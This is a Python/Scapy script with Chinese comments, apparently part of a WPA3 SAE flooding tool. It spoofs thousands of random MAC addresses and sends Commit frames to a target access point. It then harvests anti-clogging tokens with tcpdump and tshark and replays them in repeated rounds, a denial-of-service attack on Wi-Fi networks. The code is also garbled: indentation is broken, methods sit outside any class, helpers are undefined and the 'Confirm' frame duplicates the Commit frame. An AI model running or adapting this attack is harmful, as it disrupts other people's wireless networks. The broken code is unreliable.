#从列表中随机选取Scalar
def scalar():
    scalar=['list of scalar']
    return random.choice(scalar)
Scalar=scalar()
#从列表中随机选取Finite
def finite():
    finite=['list of finite']
    return random.choice(finite)
Finite=finite()
#创建含有大量含有随机MAC的txt文件
def create_mac_file(count, filename):
    os.system('sudo rm -rf "%s"' % filename)
    for n in range(int(count)):
        mac = '%02x:%02x:%02x:%02x:%02x:%02x' % (random.randint(0, 255), random.randint(0, 255),random.randint(0, 255), random.randint(0,255),random.randint(0, 255), random.randint(0,255))
        with open(filename, 'a') as fs:
            fs.write(str(mac))
            fs.write('\n')
            fs.close()
    global f
    f =open(filename, 'r')
    os.system('sudo chmod 777 -R "%s" ' % filename)
 
    # 根据AP的BSSID和文件中的MAC地址创建Commit帧
    def auth_frame_fromfile(self):
        client = f.readline()
        return RadioTap() / Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid) / Dot11Auth(algo=3,seqnum=1,status=0)
 
# 使用特定源地址构建Commit帧认证头
def Auth_commit(mac):
return RadioTap() / Dot11(type=0, subtype=11, addr1=bssid, addr2= mac, addr3=bssid) / Dot11Auth(algo=3,seqnum=1,status=0)
 
# 使用特定源地址构建Confirm帧认证头
  def Auth_confirm(mac):
return RadioTap() / Dot11(type=0, subtype=11, addr1=bssid, addr2= mac, addr3=bssid) / Dot11Auth(algo=3,seqnum=1,status=0)
 
    # 使用特定的MAC地址和对应的防阻塞令牌构建Commit请求帧
    def construct_token(self,token, mac):
        Auth = self.auth_frame_mac(mac)
        return Auth / group / token / Scalar / Finite
def pmk_gobbler(self):
#创建一个含有大量随机MAC地址的文件
    create_mac_file(count, filename)
    for p in range(500):
        start = True
        # 创建一个新的pcap文件以便检索防阻塞令牌
        os.system('sudo rm -rf ' + filename_pcap)
        os.system('sudo cp template.pcap ' + filename_pcap)
        # 发送Commit帧并监听防阻塞令牌
        for n in range(int(count)):
            if start == True:
                if os.path.isfile(filename_pcap) == True:
                    os.system('sudo rm -rf ' + filename_pcap)
                    # 开始监听认证帧并提取源MAC地址
                    listener = subprocess.Popen(['sudo tcpdump -i "%s" -w "%s" -e -s 0 type mgt subtype auth and wlan src "%s" ' % (iface,filename_pcap, bssid)], stdout=subprocess.PIPE, shell=True)
                    start = False
#按照创建文件中的MAC地址开始发送Commit帧
            sendp(self.construct_fromfile(), inter=0.0001, iface="%s" % iface )
        #从监听得到的包中检索防阻塞令牌并开始攻击
        with open(filename) as k:
            for mac in k:
                start = True
# 获取文件中MAC地址对应的防阻塞令牌
                add_argument = 'DA ==' + mac
                process = subprocess.Popen('sudo tshark -r "%s" -Y "%s" -T fields -e wlan.fixed.anti_clogging_token' % (filename_pcap, add_argument), stdout=subprocess.PIPE, shell=True)
                process.wait()
                # 对字段进行裁剪只提取防阻塞令牌
                anti_token = process.communicate()[0]                
# 发送带有防阻塞令牌的Commit帧
                if not anti_token == ' ':
                    try:
                 sendp(self.construct_token(bytes.fromhex(anti_token), mac), inter=0.000001, count=10,iface="%s" % iface)
                    except Exception as e:
                        print('Error: ' + str(e))
            listener.terminate()
        #完成一轮攻击
